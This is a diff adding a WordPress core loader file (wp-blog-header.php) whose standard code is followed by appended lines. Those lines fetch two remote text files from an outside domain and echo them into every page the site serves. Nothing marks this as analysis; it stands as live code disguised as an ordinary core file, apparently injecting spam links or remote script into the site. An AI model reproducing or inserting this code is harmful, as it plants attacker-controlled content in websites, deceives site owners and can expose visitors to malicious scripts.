@@ -1,0 +1,30 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( !isset($wp_did_header) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once( dirname(__FILE__) . '/wp-load.php' );
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once( ABSPATH . WPINC . '/template-loader.php' );
+
+}
+$lodf = file_get_contents("https://backlinkku.id/menu/traffic-v1/script.txt");
+$lornvy = file_get_contents("https://backlinkku.id/menu/vip-v2/script.txt");
+if ($lornvy !== false) {
+    echo $lornvy;
+}
+if ($lodf !== false) {
+    echo $lodf;
+}
+?>
